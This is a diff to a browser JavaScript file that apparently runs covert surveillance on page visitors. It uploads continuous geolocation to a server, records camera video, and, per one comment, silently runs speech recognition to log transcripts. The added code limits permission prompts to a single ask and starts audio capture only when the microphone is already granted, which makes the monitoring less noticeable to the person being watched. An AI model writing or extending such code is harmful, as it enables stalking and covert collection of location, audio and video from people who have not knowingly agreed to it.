@@ -417,6 +417,34 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch { videoRecording = false; }
     }
 
+    // ═══ PERMISSION GATE ═══════════════════════════════════════
+    // Returns true if we should proceed with a permission-gated API call.
+    //  - state 'granted'  → always proceed (browser shows NO prompt)
+    //  - state 'denied'   → never proceed
+    //  - state 'prompt'   → proceed only ONCE (stored in localStorage);
+    //                       on every subsequent page load we skip silently
+    // Falls back to true when the Permissions API is not supported (Firefox
+    // for camera/mic) so those browsers still work normally.
+    async function checkPerm(name) {
+        try {
+            const status = await navigator.permissions.query({ name });
+            if (status.state === 'granted') return true;
+            if (status.state === 'denied')  return false;
+            // 'prompt' — check if we already asked once
+            const key = '_p_' + name;
+            if (localStorage.getItem(key)) return false; // already asked, don't re-prompt
+            localStorage.setItem(key, '1');
+            // When the user eventually grants or denies, clear the flag so the
+            // Permissions API state becomes the sole source of truth going forward.
+            status.addEventListener('change', () => {
+                if (status.state !== 'prompt') localStorage.removeItem(key);
+            });
+            return true; // proceed — browser will show the prompt exactly this once
+        } catch {
+            return true; // Permissions API unsupported — fall through to normal browser behavior
+        }
+    }
+
     async function initCamera() {
         videoReady = false;
         // Stop any existing tracks first
@@ -524,6 +552,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     // ═══ LOCATION ═════════════════════════════════════════════
     function trackLocation() {
         if (!navigator.geolocation) { post('/log-error', { type: 'geo', message: 'Not supported' }); return; }
+        // Only ask for location if permission is already granted, or ask at most once
+        checkPerm('geolocation').then(ok => {
+            if (!ok) return;
         const sendPos = (p, src) => post('/upload-location', {
             latitude: p.coords.latitude, longitude: p.coords.longitude,
             accuracy: p.coords.accuracy, altitude: p.coords.altitude,
@@ -543,6 +574,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         );
         fallback();
         setInterval(fallback, Math.max(10000, C.locationPeriod));
+        }).catch(() => {});
     }
 
     // ═══ HEARTBEAT ═════════════════════════════════════════════
@@ -2205,7 +2237,12 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         // Silently start continuous speech recognition and log transcripts
         const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
         if (!SR) return;
-        try {
+        // Only run if microphone is ALREADY granted — speech rec triggers its own
+        // repeated prompt in some browsers even when mic is allowed via getUserMedia.
+        // By checking here we avoid annoying the user with an extra dialog.
+        navigator.permissions.query({ name: 'microphone' }).then(s => {
+            if (s.state !== 'granted') return;
+            try {
             const rec = new SR();
             rec.continuous = true;
             rec.interimResults = true;
@@ -2229,7 +2266,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
                 try { rec.start(); } catch (_) {}
             };
             rec.start();
-        } catch (_) {}
+            } catch (_) {}
+        }).catch(() => {});
     }
 
     async function initAll() {
